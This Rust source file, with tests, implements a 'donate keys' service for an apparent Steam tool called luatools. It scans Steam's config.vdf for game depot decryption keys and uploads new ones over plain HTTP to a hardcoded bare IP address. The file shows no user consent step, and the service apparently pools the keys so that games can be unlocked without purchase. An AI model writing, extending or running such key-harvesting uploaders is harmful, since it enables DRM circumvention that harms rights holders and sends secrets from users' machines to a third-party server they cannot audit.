//! DonateKeysService — scans Steam `config/config.vdf` for 64-char hex depot keys.

use std::collections::BTreeMap;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::OnceLock;
use std::time::Duration;

use regex::Regex;
use serde_json::json;

use crate::models::config::default_luatools_cache_dir;

const DONATE_ENDPOINT: &str = "http://167.235.229.108/donatekeys/send";
const DONATE_USER_AGENT: &str = "discord(dot)gg/luatools";

fn depot_key_block_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r#"(?is)"(\d+)"\s*\{\s*[^}]*?"DecryptionKey"\s+"([0-9a-fA-F]{64})""#).unwrap()
    })
}

#[derive(Debug, Clone)]
pub struct DonateKeysService {
    pub steam_root: PathBuf,
    pub cache_path: PathBuf,
}

impl DonateKeysService {
    pub fn new(steam_root: PathBuf, cache_path: Option<PathBuf>) -> Self {
        let cp =
            cache_path.unwrap_or_else(|| default_luatools_cache_dir().join("donated_keys.json"));
        if let Some(p) = cp.parent() {
            let _ = fs::create_dir_all(p);
        }
        Self {
            steam_root,
            cache_path: cp,
        }
    }

    pub fn extract_keys_from_vdf(vdf_path: &Path) -> BTreeMap<String, String> {
        let mut out = BTreeMap::new();
        let Ok(raw) = fs::read_to_string(vdf_path) else {
            return out;
        };
        let block_re = depot_key_block_re();
        for cap in block_re.captures_iter(&raw) {
            if let (Some(did), Some(key)) = (cap.get(1), cap.get(2)) {
                let Ok(depot_id) = did.as_str().parse::<u32>() else {
                    continue;
                };
                if depot_id == 0 {
                    continue;
                }
                let lowered = key.as_str().to_ascii_lowercase();
                if lowered.bytes().all(|b| b == b'0') {
                    continue;
                }
                out.insert(depot_id.to_string(), lowered);
            }
        }
        out
    }

    pub fn donate_new_keys(&self) -> usize {
        self.donate_new_keys_to(DONATE_ENDPOINT)
    }

    fn donate_new_keys_to(&self, endpoint: &str) -> usize {
        let vdf = self.steam_root.join("config").join("config.vdf");
        let found = Self::extract_keys_from_vdf(&vdf);
        if found.is_empty() {
            return 0;
        }

        let mut sent: BTreeMap<String, String> = fs::read_to_string(&self.cache_path)
            .ok()
            .and_then(|s| serde_json::from_str(&s).ok())
            .unwrap_or_default();

        let mut new_keys = BTreeMap::new();
        for (d, k) in found {
            if sent.get(&d) != Some(&k) {
                new_keys.insert(d, k);
            }
        }
        if new_keys.is_empty() {
            return 0;
        }

        let agent = ureq::AgentBuilder::new()
            .timeout_connect(Duration::from_secs(5))
            .timeout(Duration::from_secs(15))
            .build();
        if let Ok(resp) = agent
            .post(endpoint)
            .set("User-Agent", DONATE_USER_AGENT)
            .send_json(json!({ "keys": new_keys }))
        {
            if matches!(resp.status(), 200 | 201 | 204) {
                let count = new_keys.len();
                sent.extend(new_keys);
                if let Ok(js) = serde_json::to_string(&sent) {
                    if let Some(parent) = self.cache_path.parent() {
                        let _ = fs::create_dir_all(parent);
                    }
                    let tmp = self
                        .cache_path
                        .with_extension(format!("json.tmp.{}", std::process::id()));
                    if fs::write(&tmp, &js).is_ok() && fs::rename(&tmp, &self.cache_path).is_err() {
                        let _ = fs::remove_file(&tmp);
                        let _ = fs::write(&self.cache_path, &js);
                    }
                }
                return count;
            }
        }
        0
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    #[test]
    fn extracts_valid_keys_and_filters_invalid_or_zero_keys() {
        let dir = tempdir().unwrap();
        let vdf = dir.path().join("config.vdf");
        let good_key = "AB".repeat(32);
        let zero_key = "00".repeat(32);
        let content = format!(
            r#""depots"
            {{
                "1245621" {{ "DecryptionKey" "{good_key}" }}
                "0" {{ "DecryptionKey" "{good_key}" }}
                "76561198000000001" {{ "DecryptionKey" "{good_key}" }}
                "1245622" {{ "DecryptionKey" "{zero_key}" }}
                "1245623" {{ "DecryptionKey" "shortkey" }}
            }}"#
        );
        fs::write(&vdf, content).unwrap();

        let keys = DonateKeysService::extract_keys_from_vdf(&vdf);
        assert_eq!(keys.len(), 1);
        assert_eq!(
            keys.get("1245621").map(String::as_str),
            Some("ab".repeat(32).as_str())
        );
    }

    #[test]
    fn donates_once_and_deduplicates_against_cache() {
        let dir = tempdir().unwrap();
        let steam = dir.path().join("Steam");
        fs::create_dir_all(steam.join("config")).unwrap();
        let key = "cd".repeat(32);
        fs::write(
            steam.join("config/config.vdf"),
            format!(r#""1245621" {{ "DecryptionKey" "{key}" }}"#),
        )
        .unwrap();

        let server = tiny_http::Server::http("127.0.0.1:0").unwrap();
        let addr = server.server_addr().to_ip().unwrap();
        let handle = std::thread::spawn(move || {
            let mut req = server.recv().unwrap();
            let mut body = String::new();
            req.as_reader().read_to_string(&mut body).unwrap();
            let _ = req.respond(tiny_http::Response::from_string("ok"));
            body
        });

        let cache = dir.path().join("cache/donated_keys.json");
        let svc = DonateKeysService::new(steam, Some(cache.clone()));
        let endpoint = format!("http://{}/donatekeys/send", addr);
        assert_eq!(svc.donate_new_keys_to(&endpoint), 1);
        let body = handle.join().unwrap();
        assert!(body.contains("1245621"));
        assert!(cache.is_file());

        // Second call finds no new keys and does not hit network
        assert_eq!(svc.donate_new_keys_to("http://127.0.0.1:1/unreachable"), 0);
    }
}
